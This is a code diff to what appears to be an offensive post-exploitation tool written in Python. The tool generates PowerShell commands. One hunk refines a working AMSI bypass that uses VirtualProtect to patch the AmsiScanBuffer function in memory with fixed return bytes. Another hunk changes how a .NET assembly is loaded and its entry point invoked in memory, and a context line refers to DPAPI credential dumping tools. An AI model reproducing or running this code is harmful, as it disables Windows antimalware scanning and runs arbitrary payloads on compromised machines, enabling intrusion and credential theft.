@@ -428,11 +428,11 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
         cmds = [
             _import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect,
             f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
+            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]6, [uint32]64, [ref]$old)",
             "Start-Sleep -Seconds 1",
             "[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
             "Start-Sleep -Seconds 1",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
+            f"$old = [uint32]0; {_call_VirtualProtect}($addr, [IntPtr]6, [uint32]32, [ref]$old)",
         ]
         self.write_info(c(Y, "  [*] Patching AmsiScanBuffer..."))
         for cmd in cmds:
@@ -491,7 +491,7 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             f"$out = {new_HostWriter}",
             f"[Console]::SetOut($out); [Console]::SetError($out)",
             f"[void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]({argv})))" if args[1:] else
-            "[void]$dll.EntryPoint.Invoke($null, $null)",
+            "if ($dll.EntryPoint.GetParameters().Length -eq 0) { [void]$dll.EntryPoint.Invoke($null, $null) } else { [void]$dll.EntryPoint.Invoke($null, [object[]](,[string[]]@())) }",
             "[Console]::SetOut([IO.StreamWriter]::Null)",
             "[Console]::SetError([IO.StreamWriter]::Null)",
             "$out.Dispose()",
